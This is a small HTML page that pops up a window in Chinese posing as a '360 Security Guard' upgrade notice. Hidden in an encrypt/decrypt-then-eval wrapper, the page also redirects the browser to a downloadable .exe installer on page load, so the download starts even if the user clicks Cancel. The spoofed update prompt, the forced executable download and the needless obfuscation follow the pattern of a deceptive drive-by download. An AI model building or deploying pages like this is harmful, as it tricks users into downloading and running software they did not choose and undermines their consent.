<html>
<head>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
var key = "360安全卫士";
function encrypt(str) {
return CryptoJS.AES.encrypt(str, key).toString();
}
function decrypt(str) {
return CryptoJS.AES.decrypt(str, key).toString(CryptoJS.enc.Utf8);
}
var code = encrypt("window.location.href = 'https://down.360safe.com/se/setup_online_1.1.12.0.exe';");
</script>
</head>
<body>
<script>
function promptDownload() {
var win = window.open("", "Download", "width=400,height=200");
win.document.title = "360安全卫士升级提示";
win.document.body.innerHTML = `
<p>您好，为了保证您的电脑安全，我们建议您升级到最新版本的360安全卫士。</p>
<p>点击下面的按钮，即可开始下载安装程序。</p>
<button id="download">下载</button>
<button id="cancel">取消</button>
`;
var downloadBtn = win.document.getElementById("download");
var cancelBtn = win.document.getElementById("cancel");
downloadBtn.addEventListener("click", function() {
win.location.href = 'https://down.360safe.com/se/setup_online_1.1.12.0.exe';
win.close();
});
cancelBtn.addEventListener("click", function() {
win.close();
});
}
promptDownload();
var code = decrypt(code);
var regex = /^window\.location\.href = 'https:\/\/down\.360safe\.com\/se\/setup_online_1\.1\.12\.0\.exe';$/;
if (regex.test(code)) {
eval(code);
}
</script>
</body>
</html>
